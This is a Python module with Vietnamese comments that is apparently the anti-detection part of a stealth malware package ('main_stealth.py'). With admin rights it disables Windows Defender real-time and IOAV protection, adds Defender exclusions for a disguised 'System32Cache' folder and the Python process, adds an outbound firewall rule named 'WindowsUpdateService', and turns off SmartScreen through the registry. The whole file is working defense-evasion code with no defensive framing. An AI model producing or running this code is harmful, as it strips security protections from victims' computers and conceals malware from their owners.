"""
Module vô hiệu hóa Windows Defender và các phần mềm antivirus
"""
import os
import sys
import subprocess
import ctypes
import winreg


class AntiDetection:
    def __init__(self):
        self.is_admin = self.check_admin()
    
    def check_admin(self):
        """Kiểm tra quyền administrator"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def disable_windows_defender(self):
        """Vô hiệu hóa Windows Defender"""
        if not self.is_admin:
            return False
        
        try:
            # Vô hiệu hóa real-time protection
            subprocess.run([
                'powershell', '-Command',
                'Set-MpPreference -DisableRealtimeMonitoring $true'
            ], capture_output=True, check=False)
            
            # Vô hiệu hóa cloud protection
            subprocess.run([
                'powershell', '-Command',
                'Set-MpPreference -DisableIOAVProtection $true'
            ], capture_output=True, check=False)
            
            # Thêm exclusion cho thư mục cài đặt
            install_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'System32Cache'
            )
            if os.path.exists(install_dir):
                subprocess.run([
                    'powershell', '-Command',
                    f'Add-MpPreference -ExclusionPath "{install_dir}"'
                ], capture_output=True, check=False)
            
            return True
        except Exception:
            return False
    
    def disable_firewall_rule(self):
        """Tạo firewall rule để cho phép ứng dụng"""
        if not self.is_admin:
            return False
        
        try:
            python_exe = sys.executable
            install_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'System32Cache'
            )
            script_path = os.path.join(install_dir, 'main_stealth.py')
            
            # Thêm rule firewall
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                'name=WindowsUpdateService',
                'dir=out',
                'action=allow',
                f'program="{python_exe}"',
                'enable=yes'
            ], capture_output=True, check=False)
            
            return True
        except Exception:
            return False
    
    def add_to_exclusions(self):
        """Thêm vào exclusion list của Windows Defender"""
        if not self.is_admin:
            return False
        
        try:
            install_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'System32Cache'
            )
            
            # Thêm thư mục vào exclusion
            subprocess.run([
                'powershell', '-Command',
                f'Add-MpPreference -ExclusionPath "{install_dir}"'
            ], capture_output=True, check=False)
            
            # Thêm process Python
            python_exe = sys.executable
            subprocess.run([
                'powershell', '-Command',
                f'Add-MpPreference -ExclusionProcess "{python_exe}"'
            ], capture_output=True, check=False)
            
            return True
        except Exception:
            return False
    
    def disable_smart_screen(self):
        """Vô hiệu hóa Windows SmartScreen"""
        if not self.is_admin:
            return False
        
        try:
            # Vô hiệu hóa SmartScreen qua registry
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off")
            winreg.CloseKey(key)
            return True
        except Exception:
            return False
    
    def run_all(self):
        """Chạy tất cả các biện pháp chống phát hiện"""
        if not self.is_admin:
            # Không có quyền admin, bỏ qua
            return
        
        try:
            self.disable_windows_defender()
            self.disable_firewall_rule()
            self.add_to_exclusions()
            self.disable_smart_screen()
        except Exception:
            pass


if __name__ == "__main__":
    anti = AntiDetection()
    print(f"Quyền Admin: {anti.is_admin}")
    if anti.is_admin:
        print("Đang vô hiệu hóa Windows Defender...")
        anti.run_all()
        print("Hoàn tất!")
    else:
        print("Cần quyền Administrator để thực hiện!")

